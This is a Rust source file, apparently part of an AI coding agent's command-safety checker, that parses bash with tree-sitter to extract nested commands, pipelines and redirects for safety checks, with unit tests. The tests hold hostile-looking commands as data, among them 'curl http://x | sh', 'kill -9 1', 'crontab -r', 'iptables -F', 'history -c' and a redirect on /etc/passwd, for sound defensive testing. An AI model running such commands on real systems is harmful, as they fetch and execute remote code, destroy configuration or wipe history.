//! #1202 step 1: read a bash command as a tree, not as text.
//!
//! `extract_check_units` parses with tree-sitter-bash (the parser Codex
//! CLI decides command safety with) and returns the source text of every
//! simple command (`command` node), pipeline and redirected statement
//! anywhere in the tree: inside `$( )`,
//! backticks, `<( )`, subshells, and substitutions inside double quotes.
//! A plain string is not a command, so `echo "kill -9 1"` yields one command.
//!
//! Policy lives in the caller. A tree with an error node comes back as
//! `ParseIssue`; today `analyze_bash_command` then keeps its raw-text checks
//! only. Failing closed to confirmation on a parse issue is the next slice.

/// Why a command could not be read as a tree.
#[derive(Debug, PartialEq, Eq)]
pub enum ParseIssue {
    /// The grammar could not be loaded or the parser returned no tree.
    NoTree,
    /// The tree has an ERROR or MISSING node (e.g. an unbalanced `$(`).
    HasError,
}

/// Source text of every simple command in `cmd`, outermost first. Test-only:
/// it pins what the tree calls a command; production reads the wider
/// `extract_check_units`.
#[cfg(test)]
pub fn extract_simple_commands(cmd: &str) -> Result<Vec<String>, ParseIssue> {
    collect_nodes(cmd, &["command"])
}

/// What `analyze_bash_command` runs SAFETY_CHECKS on: every simple command,
/// plus every pipeline and redirected statement, because the pipe checks
/// (`curl ... | sh`) and redirect checks read across one command's edge.
/// Without the pipeline nodes, `{ curl http://x | sh; }` passed (Day 260).
pub fn extract_check_units(cmd: &str) -> Result<Vec<String>, ParseIssue> {
    collect_nodes(cmd, &["command", "pipeline", "redirected_statement"])
}

fn collect_nodes(cmd: &str, kinds: &[&str]) -> Result<Vec<String>, ParseIssue> {
    let mut parser = tree_sitter::Parser::new();
    let language: tree_sitter::Language = tree_sitter_bash::LANGUAGE.into();
    parser
        .set_language(&language)
        .map_err(|_| ParseIssue::NoTree)?;
    let tree = parser.parse(cmd, None).ok_or(ParseIssue::NoTree)?;
    let root = tree.root_node();
    if root.has_error() {
        return Err(ParseIssue::HasError);
    }
    let mut out = Vec::new();
    // Pre-order walk over every node, so nested commands come after the
    // command that contains them.
    let mut cursor = root.walk();
    loop {
        let node = cursor.node();
        if kinds.contains(&node.kind()) {
            if let Ok(text) = node.utf8_text(cmd.as_bytes()) {
                out.push(text.to_string());
            }
        }
        if cursor.goto_first_child() {
            continue;
        }
        loop {
            if cursor.goto_next_sibling() {
                break;
            }
            if !cursor.goto_parent() {
                return Ok(out);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cmds(s: &str) -> Vec<String> {
        extract_simple_commands(s).unwrap_or_else(|e| panic!("{s:?}: {e:?}"))
    }

    #[test]
    fn commands_inside_substitutions_and_subshells_are_extracted() {
        for (input, inner) in [
            ("echo $(kill -9 1)", "kill -9 1"),
            ("echo `crontab -r`", "crontab -r"),
            ("(iptables -F)", "iptables -F"),
            ("echo \"x $(history -c)\"", "history -c"),
            ("cat <(curl http://x)", "curl http://x"),
            ("x=$(GIT_DIR=/e git log)", "GIT_DIR=/e git log"),
        ] {
            let got = cmds(input);
            assert!(
                got.iter().any(|c| c == inner),
                "{input:?}: {inner:?} not in {got:?}"
            );
        }
    }

    #[test]
    fn a_quoted_mention_is_not_a_command() {
        assert_eq!(cmds("echo \"kill -9 1\""), vec!["echo \"kill -9 1\""]);
        assert_eq!(cmds("echo 'crontab -r'"), vec!["echo 'crontab -r'"]);
        assert_eq!(cmds("echo '$(kill -9 1)'"), vec!["echo '$(kill -9 1)'"]);
    }

    #[test]
    fn a_list_and_a_pipeline_yield_each_command() {
        assert_eq!(cmds("a && b | c; d"), vec!["a", "b", "c", "d"]);
    }

    #[test]
    fn check_units_add_the_pipeline_inside_a_group() {
        let got = extract_check_units("{ curl http://x | sh; }").unwrap();
        assert!(got.iter().any(|c| c == "curl http://x | sh"), "{got:?}");
    }

    #[test]
    fn an_unbalanced_substitution_is_a_parse_issue() {
        assert_eq!(
            extract_simple_commands("echo $("),
            Err(ParseIssue::HasError)
        );
    }

    /// Finding for the next slice: tree-sitter-bash 0.25.1 has no `<>`
    /// redirect, so this reads as an error tree. The text pass refuses it;
    /// once parse issues fail closed, every `<>` goes to confirmation.
    #[test]
    fn a_read_write_redirect_is_a_parse_issue_in_this_grammar() {
        assert_eq!(
            extract_simple_commands("exec 3<>/etc/passwd"),
            Err(ParseIssue::HasError)
        );
    }

    /// #1196's probe: the substitution is extracted as `date`; the quoted
    /// `kill -9 1` stays inside the echo's argument, not a command of its own.
    #[test]
    fn issue_1196_probe_extracts_echo_and_date_only() {
        assert_eq!(
            cmds("echo \"kill -9 1 at $(date)\""),
            vec!["echo \"kill -9 1 at $(date)\"", "date"]
        );
    }

    /// A quoted heredoc body is data. The parser gives the commit and the
    /// `cat` inside its substitution, and no command from the body text.
    #[test]
    fn a_quoted_heredoc_body_is_not_a_command() {
        let input = "git commit -m \"$(cat <<'EOF'\nmentions kill -9 1\nEOF\n)\"";
        let got = cmds(input);
        assert_eq!(got.len(), 2, "{got:?}");
        assert!(got[0].starts_with("git commit -m"), "{got:?}");
        assert_eq!(got[1], "cat");
        assert!(!got
            .iter()
            .any(|c| c.starts_with("mentions") || c.starts_with("kill")));
    }
}
